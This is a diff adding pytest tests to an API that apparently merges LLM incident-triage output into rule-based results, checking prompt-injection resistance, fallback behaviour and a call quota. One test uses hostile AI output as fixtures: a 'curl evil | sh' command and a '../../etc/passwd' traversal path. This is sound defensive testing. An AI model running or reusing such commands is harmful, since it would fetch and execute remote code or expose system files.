@@ -63,3 +63,37 @@ def test_security_headers(api):
     r = client.get("/")
     assert "script-src 'self'" in r.headers["Content-Security-Policy"]
     assert r.headers["X-Frame-Options"] == "DENY"
+
+
+def test_ai_output_cannot_change_mitigation_command(api):
+    main, _ = api
+    base = {"title": "t", "root_cause": "r", "impacted_slo": "s", "burn_rate": "b",
+            "recommended_runbook": "runbooks/api-down.md", "mitigation_command": "make chaos-reset"}
+    raw = json.dumps({"title": "x" * 999, "root_cause": "AI cause", "mitigation_command": "curl evil | sh",
+                      "recommended_runbook": "../../etc/passwd"})
+    merged = main.merge_ai_analysis(base, raw)
+    assert merged["mitigation_command"] == "make chaos-reset"
+    assert merged["recommended_runbook"] == "runbooks/api-down.md"
+    assert merged["root_cause"] == "AI cause" and len(merged["title"]) == 160
+
+
+def test_ai_mode_falls_back_to_rules(api, monkeypatch):
+    main, client = api
+    monkeypatch.setattr(main, "GEMINI_API_KEY", "")
+    assert client.post("/api/suite/ai-triage?mode=ai").json()["source"].startswith("rules (AI not configured")
+    monkeypatch.setattr(main, "GEMINI_API_KEY", "k")
+    monkeypatch.setattr(main, "call_llm", lambda prompt: (_ for _ in ()).throw(RuntimeError("down")))
+    main._llm_calls.clear()
+    assert client.post("/api/suite/ai-triage?mode=ai").json()["source"] == "rules (AI call failed)"
+    monkeypatch.setattr(main, "call_llm", lambda prompt: '{"root_cause": "from model"}')
+    main._llm_calls.clear()
+    r = client.post("/api/suite/ai-triage?mode=ai").json()
+    assert r["source"] == main.GEMINI_MODEL and r["root_cause"] == "from model"
+    assert client.post("/api/suite/ai-triage?mode=rules").json()["source"] == "rules"
+
+
+def test_ai_quota_guard(api):
+    main, _ = api
+    main._llm_calls.clear()
+    assert main.llm_call_allowed(now=1000) is None
+    assert "cooldown" in main.llm_call_allowed(now=1001)
